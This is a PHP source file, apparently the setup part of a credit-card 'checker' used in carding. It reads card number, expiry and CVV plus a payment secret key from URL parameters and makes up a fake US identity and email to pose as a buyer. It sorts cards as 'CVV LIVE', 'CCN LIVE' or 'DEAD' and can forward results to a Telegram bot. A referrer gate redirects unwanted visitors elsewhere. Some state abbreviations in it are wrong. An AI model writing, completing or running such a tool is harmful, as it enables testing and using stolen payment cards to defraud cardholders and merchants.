<?php
//Script Author: ᴛɪᴋᴏʟ4ʟɪғᴇ https://t.me/Tikol4Life

/*===[PHP Setup]==============================================*/
error_reporting(0);
ini_set('display_errors', 0);

/*===[Security Setup]=========================================*/
include 'config.php';
if (!$testMode) {
    if ($_GET['referrer'] != "Tikol4Life") { 
        $i = rand(0,sizeof($red_link));
        header("location: $red_link[$i]");
        exit();
    }
    if($forceAuth){
        session_start();
        if (!isset($_SESSION["Auth"])) { 
            EchoMessage('DEAD',$cc_info.' >> Session Timeout: Reload Website');
            exit();
        }
    }
}

/*===[Variable Setup]=========================================*/
$cc_info = $_GET['cc_info'];
$sk = $_GET['sk'];
$telebot = $_GET['telebot'];
$tele_msg = $_GET['tele_msg'];
if ($_COOKIE['checker_theme'] == 'dark') {
    $theme_background = '#212121';
    $theme_text = '#FFFFFF';
}else{
    $theme_background = '#FFFFFF';
    $theme_text = '#000000';
}

/*===[CC Info Validation]=====================================*/
if (!$testMode) {
    if($cc_info == "" || $sk == ""){
        exit();
    }
    $j=0;
    while ($j < (sizeof($bug_bin) - 1)) {
        if (substr($cc_info, 0, strlen($bug_bin[$j])) === $bug_bin[$j]) {
            EchoMessage('DEAD',$cc_info.' >> BUG BIN Not Accepted for checking...');
            exit();
            break;
        }
        $j++;
    }
}


/*===[Variable Setup]=========================================*/
$i = explode("|", $cc_info);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$yy = substr($yyyy, 2, 4);
$cvv = $i[3];
$bin = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);
$email = urlencode(emailGenerate());
$m = ltrim($mm, "0");

/*===[Identity Setup]=========================================*/
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
$infos = json_decode($get, 1);
$name_first = $infos['results'][0]['name']['first'];
$name_last = $infos['results'][0]['name']['last'];
$name_full = ''.$name_first.' '.$name_last.'';

$location_street = $infos['results'][0]['location']['street'];
$location_city = $infos['results'][0]['location']['city'];
$location_state = $infos['results'][0]['location']['state'];
$location_postcode = $infos['results'][0]['location']['postcode'];
if ($location_state == "alabama") {
    $location_state = "AL";
} else if ($location_state == "alaska") {
    $location_state = "AK";
} else if ($location_state == "arizona") {
    $location_state = "AR";
} else if ($location_state == "california") {
    $location_state = "CA";
} else if ($location_state == "colorado") {
    $location_state = "CO";
} else if ($location_state == "connecticut") {
    $location_state = "CT";
} else if ($location_state == "delaware") {
    $location_state = "DE";
} else if ($location_state == "district of columbia") {
    $location_state = "DC";
} else if ($location_state == "florida") {
    $location_state = "FL";
} else if ($location_state == "georgia") {
    $location_state = "GA";
} else if ($location_state == "hawaii") {
    $location_state = "HI";
} else if ($location_state == "idaho") {
    $location_state = "ID";
} else if ($location_state == "illinois") {
    $location_state = "IL";
} else if ($location_state == "indiana") {
    $location_state = "IN";
} else if ($location_state == "iowa") {
    $location_state = "IA";
} else if ($location_state == "kansas") {
    $location_state = "KS";
} else if ($location_state == "kentucky") {
    $location_state = "KY";
} else if ($location_state == "louisiana") {
    $location_state = "LA";
} else if ($location_state == "maine") {
    $location_state = "ME";
} else if ($location_state == "maryland") {
    $location_state = "MD";
} else if ($location_state == "massachusetts") {
    $location_state = "MA";
} else if ($location_state == "michigan") {
    $location_state = "MI";
} else if ($location_state == "minnesota") {
    $location_state = "MN";
} else if ($location_state == "mississippi") {
    $location_state = "MS";
} else if ($location_state == "missouri") {
    $location_state = "MO";
} else if ($location_state == "montana") {
    $location_state = "MT";
} else if ($location_state == "nebraska") {
    $location_state = "NE";
} else if ($location_state == "nevada") {
    $location_state = "NV";
} else if ($location_state == "new hampshire") {
    $location_state = "NH";
} else if ($location_state == "new jersey") {
    $location_state = "NJ";
} else if ($location_state == "new mexico") {
    $location_state = "NM";
} else if ($location_state == "new york") {
    $location_state = "LA";
} else if ($location_state == "north carolina") {
    $location_state = "NC";
} else if ($location_state == "north dakota") {
    $location_state = "ND";
} else if ($location_state == "ohio") {
    $location_state = "OH";
} else if ($location_state == "oklahoma") {
    $location_state = "OK";
} else if ($location_state == "oregon") {
    $location_state = "OR";
} else if ($location_state == "pennsylvania") {
    $location_state = "PA";
} else if ($location_state == "rhode Island") {
    $location_state = "RI";
} else if ($location_state == "south carolina") {
    $location_state = "SC";
} else if ($location_state == "south dakota") {
    $location_state = "SD";
} else if ($location_state == "tennessee") {
    $location_state = "TN";
} else if ($location_state == "texas") {
    $location_state = "TX";
} else if ($location_state == "utah") {
    $location_state = "UT";
} else if ($location_state == "vermont") {
    $location_state = "VT";
} else if ($location_state == "virginia") {
    $location_state = "VA";
} else if ($location_state == "washington") {
    $location_state = "WA";
} else if ($location_state == "west virginia") {
    $location_state = "WV";
} else if ($location_state == "wisconsin") {
    $location_state = "WI";
} else if ($location_state == "wyoming") {
    $location_state = "WY";
} else {
    $location_state = "KY";
}

/*===[PHP Functions]==========================================*/
function BotForwarder($message,$chat_ID){
    $url = $GLOBALS['token_url']."/sendMessage?chat_id=".$chat_ID."&text=".$message."&parse_mode=HTML";
    file_get_contents($url); 
}
function emailGenerate($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString.'@gmail.com';
}
function EchoMessage($CardStatus,$CardMessage){
    $MessageStructure = '';
    switch ($CardStatus) {
        case 'CVV LIVE':
            echo $MessageStructure = '
                <div class="live_cvv" style="display:none;">
                    <span class="badge badge-primary">'.$CardStatus.'</span>
                    <span style="color: '.$GLOBALS['theme_text'].'"> '.$CardMessage.'</span>
                </div>';
            break;
        case 'CCN LIVE':
            echo $MessageStructure = '
                <div class="live_ccn" style="display:none;">
                    <span class="badge badge-warning">'.$CardStatus.'</span>
                    <span style="color: '.$GLOBALS['theme_text'].'"> '.$CardMessage.'</span>
                </div>';
            break;
        case 'DEAD':
            echo $MessageStructure = '
                <div class="dead" style="display:none;">
                    <span class="badge badge-danger">'.$CardStatus.'</span>
                    <span style="color: '.$GLOBALS['theme_text'].'"> '.$CardMessage.'</span>
                </div>';
            break;
    } 
}

?>